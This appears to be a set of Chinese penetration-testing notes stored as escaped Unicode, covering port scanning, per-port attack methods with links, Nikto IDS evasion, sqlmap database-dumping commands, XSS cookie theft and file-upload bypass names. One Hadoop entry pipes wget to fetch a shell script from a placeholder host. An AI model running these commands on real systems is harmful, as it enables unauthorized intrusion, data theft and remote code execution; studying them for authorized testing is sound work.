SYN\u626b\u63cf\u65f6\u53ef\u80fd\u4f1a\u88ab\u76ee\u6807\u4e3b\u673a\u7684\u9632\u706b\u5899\u53d1\u73b0,\u4f1a\u963b\u6b62SYN\u6570\u636e\u5305,\u8fd9\u65f6\u6211\u4eec\u4f7f\u7528TCP FIN\u626b\u63cf\u65b9\u5f0f\u4f1a\u6709\u5f88\u597d\u7684\u7a7f\u900f\u6548\u679c. nmap -sF 127.0.0.1 \u626b\u63cf\u524d1000\u53f7TCP\u7aef\u53e3 nmap 192.168.100.2 Ping\u626b\u63cf8\u4e2a\u672c\u5730\u4e3b\u673a(\u6309ARP\u3001ICMP\u3001TCP 80\u7684\u987a\u5e8f) nmap \u2013sP 192.168.100.0-7 \u626b\u63cf80,443\u7aef\u53e3 nmap -p 80,443 192.168.100.2 \u626b\u63cf\u524d1000\u53f7TCP\u7aef\u53e3\uff0cOS\u6307\u7eb9\uff0c\u670d\u52a1\uff0c\u7136\u540e\u8fd0\u884c\u4e00\u4e2aNSE\u811a\u672c sudo nmap -A 192.168.100.2 \u626b\u63cf\u5168\u90e865535\u4e2aTCP\u7aef\u53e3\uff0cOS\u6307\u7eb9\uff0c\u670d\u52a1\uff0c\u7136\u540e\u8fd0\u884c\u4e00\u4e2aNSE\u811a\u672c sudo nmap \u2013A \u2013p- 192.168.100.2 \u626b\u63cf\u524d1000\u53f7UDP\u7aef\u53e3 sudo nmap -sU 192.168.100.2 \u626b\u63cf\u6240\u670965535\u4e2aUDP\u7aef\u53e3 sudo nmap -sU \u2013p- 192.168.100.2 \u626b\u63cf\u6240\u670965535\u4e2aUDP\u7aef\u53e3\uff0c\u5e76\u83b7\u53d6\u670d\u52a1\u3001OS\u6307\u7eb9\uff0c\u4e4b\u540e\u8fd0\u884c\u4e00\u4e9bNSE\u811a\u672c sudo nmap \u2013sU -p- -A 192.168.100.2 nmap\u8111\u56fe\u5907\u67e5: 1.2\u5e38\u89c1\u7aef\u53e3\u6f0f\u6d1e: \u00b6 \u5e38\u89c1\u7aef\u53e3\u6e17\u900f\u603b\u7ed3 - \u621a\u6e90 - \u535a\u5ba2\u56ed Masscan -p80,800 ip --rate=10000 \u8bc6\u522b\u7aef\u53e3\u540e\uff0c\u767e\u5ea6\u8c37\u6b4c\u76f8\u5e94\u7aef\u53e3\u653b\u51fb\u529e\u6cd5\uff08\u7aef\u53e3\u6e17\u900f\u603b\u7ed3\uff0c\u53ef\u89c1\u7b14\u8bb0\uff09 21 / FTP \uf0b7\u533f\u540d/\u66b4\u529b\u7834\u89e3 \uf0b7\u62d2\u7edd\u670d\u52a1 22 / SSH \uf0b7\u66b4\u529b\u7834\u89e3 23 / telnet \uf0b7Winbox(CVE-2018-14847) https://github.com/BasuCert/WinboxPoC \uf0b7\u5f31\u53e3\u4ee4 / \u66b4\u529b\u7834\u89e3 161 / snmp \uf0b7\u5f31\u53e3\u4ee4 https://blog.csdn.net/archersaber39/article/details/78932252 389 / ladp \uf0b7\u533f\u540d\u8bbf\u95ee https://www.cnblogs.com/persuit/p/5706432.html \uf0b7ladp\u6ce8\u5165 http://www.4hou.com/technology/9090.html https://www.freebuf.com/articles/web/149059.html 443 / ssl \uf0b7openssl\u5fc3\u810f\u51fa\u8840 https://paper.seebug.org/437/http://www.anquan.us/static/drops/papers-1381.htmlhttps://www.freebuf.com/sectool/33191.html 445 / smb \uf0b7win10\u62d2\u7edd\u670d\u52a1 \uf0b7\u6c38\u6052\u4e4b\u84ddRCE 875 / rsync \uf0b7\u533f\u540d\u8bbf\u95ee http://www.anquan.us/static/bugs/wooyun-2016-0190815.htmlhttps://paper.seebug.org/409/http://www.91ri.org/11093.html 1433 / mssql \uf0b7\u66b4\u529b\u7834\u89e3 http://www.anquan.us/static/drops/tips-12749.htmlhttps://www.seebug.org/appdir/Microsoft%20SQL%20Server 1521 / oracle \uf0b7\u66b4\u529b\u7834\u89e3 https://www.exploit-db.com/exploits/33084 2601 / zebra \uf0b7 http://www.anquan.us/static/bugs/wooyun-2013-047409.html 3128 / squid 3306 / mysql \uf0b7RCE http://www.91ri.org/17511.html CVE-2015-0411 \uf0b7hash\u7834\u89e3 https://www.freebuf.com/column/153561.html \uf0b7waf\u7ed5\u8fc7 https://www.freebuf.com/articles/web/155570.html \uf0b7general_log_file getshell https://www.freebuf.com/column/143125.html \uf0b7\u63d0\u6743 http://www.91ri.org/16540.html 3312 / kangle \uf0b7getshell https://www.secpulse.com/archives/23927.html 3389 / rdp \uf0b7shift \u653e\u5927\u955c \u8f93\u5165\u6cd5\u7ed5\u8fc7 guest\u7528\u6237 \uf0b7\u6c38\u6052\u4e4b\u84dd(ESTEEMAUDIT) https://www.freebuf.com/articles/system/132171.htmlhttps://www.anquanke.com/post/id/86328 \uf0b7ms12-020 https://blog.csdn.net/meyo_leo/article/details/77950552 4440 / rundeck \uf0b7 https://www.secpulse.com/archives/29500.html 4848 / glassfish \uf0b7\u6587\u4ef6\u8bfb\u53d6 https://www.secpulse.com/archives/42277.html https://www.anquanke.com/post/id/85948 \uf0b7GlassFish2 / admin:admin GlassFish3,4 / \u5982\u679c\u7ba1\u7406\u5458\u4e0d\u8bbe\u7f6e\u5e10\u53f7\u672c\u5730\u4f1a\u81ea\u52a8\u767b\u5f55,\u8fdc\u7a0b\u8bbf\u95ee\u4f1a\u63d0\u793a\u914d\u7f6e\u9519\u8bef 5432 / PostgreSQL \uf0b7RCE https://www.cnblogs.com/KevinGeorge/p/8521496.html https://www.secpulse.com/archives/69153.html \uf0b7\u9ed8\u8ba4\u8d26\u53f7postgres \uf0b7\u53c2\u8003 http://www.91ri.org/13070.html http://www.91ri.org/6507.html 5672,15672,4369,25672 / RabbitMQ \uf0b7\uff08guest/guest\uff09 5900 / VNC \uf0b7 https://www.seebug.org/appdir/RealVNC 5984 / CouchDB \uf0b7 http://xxx:5984/_utils/ 6082 / varnish \uf0b7CLI \u672a\u6388\u6743 https://www.secpulse.com/archives/10681.html 6379 / redis \uf0b7Redis\u672a\u6388\u6743 ssh publickey crontab webshell \u53cd\u5e8f\u5217\u5316 \u5f00\u673a\u81ea\u542f\u6587\u4ef6\u5939\u5199bat \uf0b7\u53c2\u8003 https://www.freebuf.com/column/170710.html 7001,7002 / WebLogic \uf0b7\u9ed8\u8ba4\u5f31\u53e3\u4ee4 weblogic/weblogic ,weblogic/welcom ,weblogic/welcom1,weblogic1/weblogic \uf0b7\u53cd\u5e8f\u5217 CVE-2018-2628 https://www.freebuf.com/articles/web/169770.html https://www.seebug.org/appdir/WebLogic 9200,9300 / elasticsearch \uf0b7CVE-2015-1427 http://www.anquan.us/static/drops/papers-5142.html \uf0b7CVE-2018-17246 https://www.seebug.org/vuldb/ssvid-97730 \uf0b7\u53c2\u8003 https://www.seebug.org/search/?keywords=elasticsearch 9000 / fcgi \uf0b7 https://paper.seebug.org/289/ 9043 / WebSphere \uf0b7Websphere8.5 https://localhost:9043/ibm/console/logon.jsp \uf0b7Websphere6-7 http://localhost:9043/ibm/console \uf0b7\u540e\u53f0\u672a\u6388\u6743\uff0c\u767b\u5f55\u540e\u53ef\u90e8\u7f72WAR\u5305 \uf0b7SOAP\u670d\u52a1\u6709\u53cd\u5e8f\u5217\u5316 \uf0b7\u5f31\u53e3\u4ee4\uff1aadmin / password 11211 / memcache \uf0b7\u672a\u6388\u6743 \uf0b7UDP\u53cd\u5c04 https://shockerli.net/post/memcached-udp-reflection-attack-bug/ 27017,27018 / Mongodb \uf0b7\u672a\u6388\u6743 \uf0b7\u6ce8\u5165 https://www.anquanke.com/post/id/83763 \uf0b7phpMoAdmin RCE https://www.aqniu.com/threat-alert/6978.html 50000 / SAP \uf0b7 SAP\u547d\u4ee4\u6267\u884c https://www.secpulse.com/archives/20204.html 50070,50030 / hadoop \uf0b7\u672a\u6388\u6743 https://www.freebuf.com/vuls/173638.html \uf0b7\u547d\u4ee4\u6267\u884c host:50060/pstack?pid=123|wget http://somehost/shell.sh https://www.seebug.org/search/?keywords=hadoop \u5176\u4ed6 \uf0b7 http://www.91ri.org/15441.html 1.3WAF\u53cabypass \u00b6 \u63a2\u6d4bWAF Nmap\u63a2\u6d4bWAF\u6709\u4e24\u79cd\u811a\u672c\uff0c\u4e00\u79cd\u662fhttp-waf-detect\uff0c\u4e00\u79cd\u662fhttp-waf-fingerprint\u3002 nmap -p port --script=http-waf-detect ip wafw00f -a example.com sqlmap-u \u201c http://www.vxxxx.org/ex.php?id=1 \u201d --identify-waf bypass: \u5f85\u8865\u5145 1.4****\u76ee\u5f55\u3001\u540e\u53f0\u548c\u654f\u611f\u8def\u5f84\u6587\u4ef6\u626b\u63cf \u00b6 \u5fa1\u5251\u76ee\u5f55\uff08\u571f\u53f8\u4e13\u7248\uff0c\u7b14\u8bb0\u91cc\u6709\uff09\u3001\u540e\u53f0\u626b\u63cf\uff08\u56fe\u7247\u5c5e\u6027\u5730\u5740\u66b4\u9732\uff09\uff0c \u200b \u5b8c\u5584\u76ee\u5f55\u548c\u8d26\u5bc6\u5b57\u5178\u65b9\u6cd5\uff1a \u200b { \u200b H:\\\u5b57\u5178\uff1b \u200b pydictor\u65b0\u5efa\uff1b \u200b \u5408\u5e76\u540e\u53bb\u91cd\u590d\uff1a \u200b dymerge.py -u \u200b python pydictor.py -tool uniqbiner /my/dict/dirpath --output uniq.txt \u200b python pydictor.py -tool uniqifer /tmp/dicts.txt --output /tmp/uniq.txt \u200b } 2.\u4eba\u5de5\u6d4f\u89c8\\\u4e00\u4e2a\u8bf7\u6c42\u4e00\u4e2a\u8bf7\u6c42\u7684burp **\u975e\u5e38**\u91cd\u8981,\u6709\u5fc5\u8981\u624b\u52a8\u53bb\u6d4f\u89c8\u6bcf\u4e2a\u9875\u9762\uff0c\u70b9\u51fb\u9875\u9762\u4e0a\u6bcf\u4e00\u4e2a\u8df3\u8f6c\uff0c\u8fd9\u6837\u5728Burp\u7684sitemap\u91cc\u9762\u5c31\u53ef\u4ee5\u51fa\u73b0\u8fd9\u4e9b\u8bf7\u6c42\u548c\u54cd\u5e94\u3002 \uff01\uff01\uff01\u624b\u5de5\u6d4f\u89c8\u5bf9\u4e8e\u5355\u9875\u5e94\u7528\u975e\u5e38\u975e\u5e38\u91cd\u8981\u3002\u81ea\u52a8\u5316\u7684\u7f51\u9875\u722c\u866b\u4e0d\u80fd\u591f\u722c\u5230\u5355\u9875\u5e94\u7528\u56e0\u4e3a\u5355\u9875\u5e94\u7528\u7684HTTP\u8bf7\u6c42\u90fd\u662f\u7528\u5f02\u6b65\u7684AJAX\u6765\u8fdb\u884c\u7684\u3002 \u56fe\u7247\u540e\u53f0\u5730\u5740\\\u56fe\u7247\u540e\u9762\u7684\u4fe1\u606f \u8df3\u8f6c\u53c2\u6570\\\u5947\u602a\u7684\u53c2\u6570 \u6cc4\u9732\u90ae\u7bb1\u7b49\u7b49 \u4e1a\u52a1\u903b\u8f91\\\u67b6\u6784 3.\u81ea\u52a8\u5316 \u81ea\u52a8\u5316\u6e17\u900f\u6d4b\u8bd5\u6846\u67b6:( \u5f85\u8865\u5145 ) Sn1per Ary Ary\u81ea\u52a8\u6e17\u900f\u4f7f\u7528\u4f53\u9a8c \u200b 0x03 \u6f0f\u6d1e\u6316\u6398 \u00b6 1.\u6f0f\u6d1e\u626b\u63cf\u5de5\u5177 \u00b6 \u6ce8\u610f:\u767b\u5f55\u7c7b\u7f51\u7ad9\u626b\u63cf\u8981\u5e26cookies\u626b\u624d\u80fd\u626b\u5230 1.1Nikto Web\u670d\u52a1\u6f0f\u6d1e\u626b\u63cf\u5668 \u00b6 Tips:\u5229\u7528-Format\u9009\u9879\u6765\u5bfc\u51fa\u7279\u5b9a\u683c\u5f0f\u7684\u626b\u63cf\u7ed3\u679c\uff0c\u4f7f\u626b\u63cf\u7ed3\u679c\u66f4\u5bb9\u6613\u9605\u8bfb\u548c\u5206\u6790\u3002 nikto -host http://example.com -output ~/nikto.html -Format html NIKTO\u4f7f\u7528\u65b9\u6cd5\uff1a 1\u3001\u547d\u4ee4\uff1anikto -update #\u5347\u7ea7\uff0c\u66f4\u65b0\u63d2\u4ef6\uff1b 2\u3001Nikto -list-plugins #\u67e5\u770b\u63d2\u4ef6\uff1b 3\u3001Nikto -host http://1.1.1.1 #\u626b\u63cf\u76ee\u6807\uff1a\u57df\u540d\u65b9\u5f0f\uff1b 4\u3001Nikto -host http://1.1.1.1 -output #\u626b\u63cf\u5e76\u8f93\u51fa\u7ed3\u679c 5\u3001Nikto -host 1.1.1.1 -port 80 #\u626b\u63cf\u76ee\u6807\uff1aip\u5730\u5740\u52a0\u7aef\u53e3\u53f7 6\u3001Nikto -host www.baidu.com -port 443 -ssl #\u626b\u63cfhttps\u7f51\u7ad9 7\u3001Nikto -host \u6587\u4ef6\u540d.txt #\u6279\u91cf\u626b\u63cf\u76ee\u6807 8\u3001nmap -p80 192.168.1.0/24 -oG - | nikto -host - #\u5229\u7528nmap\u626b\u63cf\u5f00\u653e80\u7aef\u53e3\u7684IP\u6bb5\u5e76\u4e14oG\uff08nmap\u7ed3\u679c\u8f93\u51fa\u5e76\u6574\u7406\uff09\u901a\u8fc7\u7ba1\u9053\u7684\u65b9\u5f0f\u201c|\u201d\u7528nikto\u8fdb\u884c\u626b\u63cf 9\u3001nikto -host 192.168.0.1 -useproxy http://localhost:8070 #\u5229\u7528\u4ee3\u7406\u8fdb\u884c\u626b\u63cf 10\u3001-vhost #\u5f53\u4e00\u4e2a\u7f51\u7ad9\u5b58\u5728\u591a\u4e2a\u7aef\u53e3\u65f6\u53ef\u4ee5\u4f7f\u7528-vhost\u904d\u5386\u6240\u6709\u7f51\u7ad9\u8fdb\u884c\u626b\u63cf\u6216\u4e00\u4e2aip\u5bf9\u5e94\u591a\u4e2a\u7f51\u7ad9 11\u3001Nikto\u4ea4\u4e92\u5f62\u53c2\u6570\uff1a \u7a7a\u683c \u62a5\u544a\u5f53\u524d\u626b\u63cf\u72b6\u6001 v \u663e\u793a\u8be6\u7ec6\u4fe1\u606f\uff08verbose\uff09 d \u8c03\u8bd5\u4fe1\u606f\uff08\u53ca\u5176\u8be6\u7ec6\u4fe1\u606f\uff09 e \u663e\u793a\u9519\u8bef\u4fe1\u606f p \u663e\u793a\u626b\u63cf\u8fdb\u5ea6 r \u663e\u793a\u91cd\u5b9a\u5411\u4fe1\u606f c \u663e\u793acookie a \u8eab\u4efd\u8ba4\u8bc1\u8fc7\u7a0b\u663e\u793a\u51fa\u6765 q \u9000\u51fa N \u626b\u63cf\u4e0b\u4e00\u4e2a\u76ee\u6807 P \u6682\u505c\u626b\u63cf \u914d\u7f6e\u6587\u4ef6\uff1a \u8def\u5f84\uff1a/etc/nikto.conf User Agent\u4e2d\u6587\u540d\u4e3a\u7528\u6237\u4ee3\u7406\uff0c\u7b80\u79f0 UA\uff0c\u5b83\u662f\u4e00\u4e2a\u7279\u6b8a\u5b57\u7b26\u4e32\u5934\uff0c\u4f7f\u5f97\u670d\u52a1\u5668\u80fd\u591f\u8bc6\u522b\u5ba2\u6237\u4f7f\u7528\u7684\u64cd\u4f5c\u7cfb\u7edf\u53ca\u7248\u672c\uff1b \u5728nikto\u4e2d\u6700\u597d\u4fee\u6539\u6210\u522b\u7684\u6d4f\u89c8\u5668user agent\uff1b \u8bbe\u7f6ecookie\uff1a \u5728\u914d\u7f6e\u6587\u4ef6\u4e2d\u627e\u5230cookie\u8fdb\u884c\u8bbe\u7f6e\uff08#STATIC-COOKIE= \"cookie1\"=\"cookie value\";\"cookie2\"=\"cookie val\"\uff09 IDS\u9003\u907f\u6280\u672f\uff1a\u2018 \u4e3b\u8981\u4e3a\u4e86\u8eb2\u907fIDS\u3001IPS\u68c0\u6d4b\u544a\u8b66 -evasion #\u6b64\u53c2\u6570\u4f7f\u7528\u65b9\u5f0f\uff08Nikto -host http://1.1.1.1 -evasion 1234\uff09 \u9003\u907f\u65b9\u5f0f\u51718\u79cd\uff1a 1\u3001\u968f\u673aurl\u7f16\u7801\uff0c2\u3001\u81ea\u9009\u8def\u5f84\uff0c3\u3001\u8fc7\u65e9\u7ed3\u675f\u7684URL\uff0c4\u3001\u4f18\u5148\u8003\u8651\u957f\u968f\u673a\u5b57\u7b26\u4e32 5\u3001\u53c2\u6570\u6b3a\u9a97\uff0c6\u3001\u4f7f\u7528TAB\u4f5c\u4e3a\u547d\u4ee4\u7684\u5206\u9694\u7b26\uff0c7\u3001\u4f7f\u7528\u53d8\u5316\u7684URL\uff0c8\u3001\u4f7f\u7528Windows\u8def\u5f84\u5206\u9694\u7b26 1.2****AWVS\u6f0f\u626b \u00b6 \u8fd9\u4e2a\u6ca1\u4ec0\u4e48\u597d\u8bf4\u7684\uff0c\u7834\u89e3\u7248\u5230\u5904\u90fd\u662f\u3002 1.3NESSUS \u00b6 \u5b9e\u65f6\u66f4\u65b0\u63d2\u4ef6\u7684\u6f0f\u626b\uff0c\u5f88\u597d\u7528\uff0c\u5c31\u662f\u6fc0\u6d3b\u6d41\u7a0b\u9ebb\u70e6\u3002 \u7834\u89e3\u6d41\u7a0b\uff1a 1.4Xray\u81ea\u52a8\u5316 \u00b6 \u81ea\u52a8\u5316\u7684\u6f0f\u6d1e\u6316\u6398 burp+xray\uff1a BurpSuite + Xray \u88ab\u52a8\u626b\u63cf\u914d\u7f6e - Ritte - \u535a\u5ba2\u56ed \u6216\u8005\u76f4\u63a5\u6302\u6d4f\u89c8\u5668\uff0c\u70b9\u5230\u54ea\u91cc\uff0c\u626b\u5230\u54ea\u91cc 1.5Fuzz \u00b6 \u540d \u79f0 \u63cf\u8ff0 Burp Engagement Tools Burp Suite Pro\u4e2d\u81ea\u5e26\u7684\u6709\u7279\u6b8a\u7528\u9014\u7684\u5de5\u5177\u96c6 Engagement Tool: Discover Content Burp Suite Pro\u81ea\u5e26\u7684\u7528\u4e8e\u5f3a\u5236\u6d4f\u89c8\u7684\u5de5\u5177 Burp Intruder Burp Suite\u4e2d\u53ef\u81ea\u5b9a\u4e49\u7684\u7528\u4e8e\u81ea\u52a8\u5316\u7684\u653b\u51fb\u7684\u6a21\u5757\u3002(\u6bd4\u5982brute forcing, injection\u7b49) FuzzDB \u5305\u542b\u5404\u79cd\u6076\u610f\u8f93\u5165\u3001\u8d44\u6e90\u540d\u3001\u7528\u4e8egrep\u641c\u7d22\u54cd\u5e94\u5185\u5bb9\u7684\u5b57\u7b26\u4e32\u3001Webshell\u7b49\u3002 Fuzz\u53ef\u4ee5\u53d1\u73b0\u5e94\u7528\u7a0b\u5e8f\u4e2d\u6ca1\u6709\u88ab\u5f15\u7528\u4f46\u662f\u786e\u5b9e\u662f\u53ef\u4ee5\u8bbf\u95ee\u7684\u9875\u9762\u3002 Discover Content\u662fBurp\u4e2d\u4e13\u95e8\u7528\u4e8e\u6b64\u76ee\u7684\u7684\u5de5\u5177\u3002 \u9664\u6b64\u4e4b\u5916\uff0cBurp Intruder\u4e5f\u53ef\u4ee5\u901a\u8fc7\u5b57\u5178\u653b\u51fb\u6765\u5b9e\u65bd\u5f3a\u5236\u6d4f\u89c8(\u901a\u5e38\u662f\u5728url\u53c2\u6570\u548c\u6587\u4ef6\u8def\u5f84\u90e8\u5206\u8fdb\u884c\u4fee\u6539)\u3002 FuzzDB\u5305\u542b\u4e00\u4e9b\u7528\u4e8e\u6b64\u76ee\u7684\u7684\u975e\u5e38\u725b\u903c\u7684\u5b57\u5178\uff0c\u53ef\u4ee5\u5728 \u8fd9\u91cc \u770b\u770b\u3002 \u00b6 2.\u624b\u52a8\u6316\u6398 \u00b6 2.1SQL\u6ce8\u5165\uff1a \u00b6 \u521d\u6b65\u6d4b\u8bd5\uff1a \u89c1\u6846\u5c31\u4e0a\uff0c\u52a0' \" ) ))% and 1=1 and 1=2\uff0c \u6293\u5305\u7206\u7834\u5e38\u7528SQL\u6ce8\u5165payload \u901a\u8fc7\u641c\u7d22\u5f15\u64ce\uff0c\u6279\u91cf\u67e5\u627e\u6ce8\u5165\u70b9\uff0c\u8be6\u89c1\u7b14\u8bb0\u3002 \u7136\u540e\u7528\u5080\u5121\u6ce8\u5165\u70b9\u6279\u91cf\u641c\u96c6\u5de5\u5177 \u5b9e\u64cd\u6848\u4f8b\uff1a sql\u6ce8\u5165\u601d\u8def\uff08\u767b\u5f55\u754c\u9762\uff09\u548c\u7f51\u7edc\u5e38\u7528\u7aef\u53e3_u011975363\u7684\u4e13\u680f-CSDN\u535a\u5ba2 \u200b \u8d85\u7ea7SQL\u6ce8\u5165\u5de5\u5177\uff08github\uff09 sqlmap\u4e00\u628a\u68ad\uff1a \u6ce8\u610f\uff1a\u547d\u4ee4\u4e3akali linux\u4e2d\u8fd0\u884c\u7684 \uff08windows\u4e2d\u7528python sqlmap.py\u6267\u884c\uff09 1#\u3001\u6ce8\u5165\u516d\u8fde\uff1a \u00b6 1.sqlmap -u \" http://www.xx.com?id=x \" \u3010\u67e5\u8be2\u662f\u5426\u5b58\u5728\u6ce8\u5165\u70b9 2.--dbs \u3010\u68c0\u6d4b\u7ad9\u70b9\u5305\u542b\u54ea\u4e9b\u6570\u636e\u5e93 3.--current-db \u3010\u83b7\u53d6\u5f53\u524d\u7684\u6570\u636e\u5e93\u540d 4.--tables -D \"db_name\" \u3010\u83b7\u53d6\u6307\u5b9a\u6570\u636e\u5e93\u4e2d\u7684\u8868\u540d -D\u540e\u63a5\u6307\u5b9a\u7684\u6570\u636e\u5e93\u540d\u79f0 5.--columns -T \"table_name\" -D \"db_name\" \u3010\u83b7\u53d6\u6570\u636e\u5e93\u8868\u4e2d\u7684\u5b57\u6bb5 6.--dump -C \"columns_name\" -T \"table_name\" -D \"db_name\" \u3010\u83b7\u53d6\u5b57\u6bb5\u7684\u6570\u636e\u5185\u5bb9 2#\u3001COOKIE\u6ce8\u5165\uff1a \u00b6 sqlmap -u \" http://www.xx.com /xxx.asp\" --cookie \"id=XXX cookie\" --level 2 \u3010cookie\u6ce8\u5165 \u540e\u63a5cookie\u503c 3#\u3001POST\u6ce8\u5165\uff1a \u00b6 \uff081\uff09\u76ee\u6807\u5730\u5740http:// www.xxx.com /login.asp \uff082\uff09\u6253\u5f00burp\u4ee3\u7406 \uff083\uff09\u70b9\u51fb\u8868\u5355\u63d0\u4ea4 \uff084\uff09burp\u83b7\u53d6\u62e6\u622a\u4fe1\u606f\uff08post\uff09 \uff085\uff09\u53f3\u952e\u4fdd\u5b58\u6587\u4ef6\uff08.txt\uff09\u5230\u6307\u5b9a\u76ee\u5f55\u4e0b \uff086\uff09\u8fd0\u884csqlmap\u5e76\u6267\u884c\u5982\u4e0b\u547d\u4ee4\uff1a \u7528\u4f8b\uff1asqlmap -r okay.txt -p username // -r\u8868\u793a\u52a0\u8f7d\u6587\u4ef6(\u53ca\u6b65\u9aa4\uff085\uff09\u4fdd\u5b58\u7684\u8def\u5f84)\uff0c-p\u6307\u5b9a\u53c2\u6570\uff08\u5373\u62e6\u622a\u7684post\u8bf7\u6c42\u4e2d\u8868\u5355\u63d0\u4ea4\u7684\u7528\u6237\u540d\u6216\u5bc6\u7801\u7b49name\u53c2\u6570\uff09 \uff087\uff09\u81ea\u52a8\u83b7\u53d6\u8868\u5355\uff1a--forms\u81ea\u52a8\u83b7\u53d6\u8868\u5355 \u4f8b\u5982\uff1asqlmap -u www.xx.com/login.asp --forms \uff088\uff09\u6307\u5b9a\u53c2\u6570\u641c\u7d22\uff1a--data \u4f8b\u5982:sqlmap -u www.xx.com/login.asp --data \"username=1\" 4#\u3001\u5e38\u7528\u6307\u4ee4\uff1a \u00b6 \\1. --purge \u3010\u91cd\u65b0\u626b\u63cf\uff08--purge \u5220\u9664\u539f\u5148\u5bf9\u8be5\u76ee\u6807\u626b\u63cf\u7684\u8bb0\u5f55\uff09 \\2. --tables \u3010\u83b7\u53d6\u8868\u540d \\3. --dbs \u3010\u68c0\u6d4b\u7ad9\u70b9\u5305\u542b\u54ea\u4e9b\u6570\u636e\u5e93 \\4. --current-db \u3010\u83b7\u53d6\u5f53\u524d\u7684\u6570\u636e\u5e93\u540d \\5. --current-user \u3010\u68c0\u6d4b\u5f53\u524d\u7528\u6237 \\6. --is-dba \u3010\u5224\u65ad\u7ad9\u70b9\u7684\u5f53\u524d\u7528\u6237\u662f\u5426\u4e3a\u6570\u636e\u5e93\u7ba1\u7406\u5458 \\7. --batch \u3010\u9ed8\u8ba4\u786e\u8ba4\uff0c\u4e0d\u8be2\u95ee\u4f60\u662f\u5426\u8f93\u5165 \\8. --search \u3010\u540e\u9762\u8ddf\u53c2\u6570 -D -T -C \u641c\u7d22\u5217\uff08C\uff09\uff0c\u8868\uff08T\uff09\u548c\u6216\u6570\u636e\u5e93\u540d\u79f0\uff08D\uff09 \\9. --threads 10 \u3010\u7ebf\u7a0b\uff0csqlmap\u7ebf\u7a0b\u6700\u9ad8\u8bbe\u7f6e\u4e3a10 \\10. --level 3 \u3010sqlmap\u9ed8\u8ba4\u6d4b\u8bd5\u6240\u6709\u7684GET\u548cPOST\u53c2\u6570\uff0c\u5f53--level\u7684\u503c\u5927\u4e8e\u7b49\u4e8e2\u7684\u65f6\u5019\u4e5f\u4f1a\u6d4b\u8bd5HTTP Cookie\u5934 \u200b \u7684\u503c\uff0c\u5f53\u5927\u4e8e\u7b49\u4e8e3\u7684\u65f6\u5019\u4e5f\u4f1a\u6d4b\u8bd5User-Agent\u548cHTTP Referer\u5934\u7684\u503c\u3002\u6700\u9ad8\u4e3a5 \\11. --risk 3 \u3010\u6267\u884c\u6d4b\u8bd5\u7684\u98ce\u9669\uff080-3\uff0c\u9ed8\u8ba4\u4e3a1\uff09risk\u8d8a\u9ad8\uff0c\u8d8a\u6162\u4f46\u662f\u8d8a\u5b89\u5168 \\12. -v \u3010\u8be6\u7ec6\u7684\u7b49\u7ea7(0-6) \u200b 0\uff1a\u53ea\u663e\u793aPython\u7684\u56de\u6eaf\uff0c\u9519\u8bef\u548c\u5173\u952e\u6d88\u606f\u3002 \u200b 1\uff1a\u663e\u793a\u4fe1\u606f\u548c\u8b66\u544a\u6d88\u606f\u3002 \u200b 2\uff1a\u663e\u793a\u8c03\u8bd5\u6d88\u606f\u3002 \u200b 3\uff1a\u6709\u6548\u8f7d\u8377\u6ce8\u5165\u3002 \u200b 4\uff1a\u663e\u793aHTTP\u8bf7\u6c42\u3002 \u200b 5\uff1a\u663e\u793aHTTP\u54cd\u5e94\u5934\u3002 \u200b 6\uff1a\u663e\u793aHTTP\u54cd\u5e94\u9875\u9762\u7684\u5185\u5bb9 \\13. --privileges \u3010\u67e5\u770b\u6743\u9650 \\14. --tamper xx.py,cc.py \u3010\u9632\u706b\u5899\u7ed5\u8fc7\uff0c\u540e\u63a5tamper\u5e93\u4e2d\u7684py\u6587\u4ef6 \\15. --method \"POST\" --data \"page=1&id=2\" \u3010POST\u65b9\u5f0f\u63d0\u4ea4\u6570\u636e \\16. --threads number\u3000\u3000\u3010\u91c7\u7528\u591a\u7ebf\u7a0b \u540e\u63a5\u7ebf\u7a0b\u6570 \\17. --referer \"\" \u3010\u4f7f\u7528referer\u6b3a\u9a97 \\18. --user-agent \"\" \u3010\u81ea\u5b9a\u4e49user-agent \\19. --proxy \u201c\u76ee\u6807\u5730\u5740\u2033 \u3010\u4f7f\u7528\u4ee3\u7406\u6ce8\u5165 sqlmap\u5e38\u7528\u8def\u5f84\uff1a \\1. \u6dfb\u52a0\u8868\u5b57\u6bb5\u7684\u76ee\u5f55\u5728/usr/share/sqlmap/txt/common-tables.txt \\2. \u5b58\u653e\u626b\u63cf\u8bb0\u5f55\u7684\u76ee\u5f55\u5728/root/.sqlmap/output \u9ad8\u9636\u73a9\u6cd5\uff1a \u81ea\u5df1\u5199tamper.py 2.2XSS\u8de8\u7ad9\u811a\u672c\u653b\u51fb\uff1a \u00b6 xss\u6f0f\u6d1e\u539f\u7406\u5206\u6790\u4e0e\u6316\u6398\u65b9\u6cd5 - \u77e5\u4e4e web\u6f0f\u6d1e | XSS\uff08\u8de8\u7ad9\u653b\u51fb\u811a\u672c\uff09\u8be6\u89e3 XSS\u6c47\u603b XSS\u5c0f\u7ed3 - \u5148\u77e5\u793e\u533a [2020\u8de8\u7ad9\u70b9\u811a\u672c xss]\u901f\u67e5\u8868|\u96e8\u82c1 XSSer\u81ea\u52a8\u5316\u5de5\u5177 XSStrike \u81ea\u52a8\u5316\u7ed5\u8fc7WAF xss payload\u5b57\u5178 burp\u7206\u7834 \u5ba2\u670d\u5bf9\u8bdd\u7cfb\u7edf\u4e0aXSS\u6253cookie \u642d\u5efaXSS\u5e73\u53f0 2.3\u6587\u4ef6\u4e0a\u4f20 \u00b6 \u200b \u5b57\u5178\u751f\u6210 https://github.com/c0ny1/upload-fuzz-dic-builder \u200b \u7578\u5f62\u6587\u4ef6\u540d \u200b Windows \u200b shell.php{%80-%99} \u200b NTFS ADS\u7279\u6027 \u200b shell.php...... \u200b shell.php::$DATA \u200b shell.php:a.jpg \u200b \u76ee\u5f55\u7a7f\u8d8a \u200b \u4e0a\u4f20\u540e\u5982\u679c\u6ca1\u6709\u88ab\u6587\u4ef6\u91cd\u547d\u540d\uff0c\u53ef\u4ee5\u5728\u6587\u4ef6\u540d\u503c\u505a\u76ee\u5f55\u8df3\u8f6c \u200b \u6ce8\u610f\u4e00\u4e9b\u50cf\u76ee\u5f55\u7684\u53c2\u6570\u540d \u200b dir \u200b path \u200b location \u200b url \u200b \u6587\u4ef6\u5934\u7ed5\u8fc7 \u200b \u4fee\u6539\u4e0a\u4f20\u7c7b\u578b Content-Type \u53cc\u6587\u4ef6\u4e0a\u4f20 \u622a\u65ad \u2022 \u957f\u6587\u4ef6\u540d \u2022 \u957fContent-Disposition \u2022 %00\u622a\u65ad 